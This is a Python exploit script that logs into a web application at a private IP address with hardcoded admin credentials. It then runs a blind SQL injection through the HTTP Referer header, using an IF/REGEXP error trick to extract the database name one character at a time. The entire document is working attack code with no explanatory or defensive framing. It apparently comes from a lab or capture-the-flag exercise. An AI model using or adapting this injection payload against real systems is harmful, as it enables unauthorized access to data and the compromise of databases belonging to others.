import requests
import string
import pdb
r = requests.Session()
login_data = {'username':'admin ', 'password':'qwerty'}

r_login = r.post("https://172.27.36.9:4435/login.php", login_data, verify=False)
#print(r_login.content)
charset = string.ascii_letters + string.digits

str1 = ""
pos = "01"
#char_try = "097"

while True:
    for char in charset:
        char_try = str(ord(char))
        referer = "%27%20OR%20(SELECT%201%20REGEXP%20IF(ASCII(SUBSTRING((SELECT%20DATABASE())%2C" + pos + "%2C1))%3D" + char_try + "%2C1%2C1/0))%20OR%20%271"
        headers = {'Referer': referer, 'Cookie': 'PHPSESSID=baesfhleailj0vphmi1qi1baq3'}
        request= {'review': 'abc', 'team': 'admin', 'action' : 'submit'}
        e = r.post("https://172.27.36.9:4435/index.php", request, headers=headers, verify=False)
        if "bad" not in e.text:
            pos = str(int(pos) + 1)
            str1 = str1 + char
